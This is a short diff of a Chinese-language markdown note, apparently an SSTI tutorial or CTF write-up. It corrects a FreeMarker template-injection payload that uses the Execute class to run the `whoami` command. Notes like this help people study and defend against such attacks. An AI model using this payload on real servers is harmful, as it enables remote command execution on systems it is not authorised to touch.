@@ -366,7 +366,7 @@ ${v}
 透過 Document 了解如何實例化一個新類別以及應該使用哪個類別\
 建構 Payload
 ```java
-${"ce"?new()("whoami")}
+${"freemarker.template.utility.Execute"?new()("whoami")}
 ```
 ![image](https://hackmd.io/_uploads/BJqAIk08Ze.png)
 
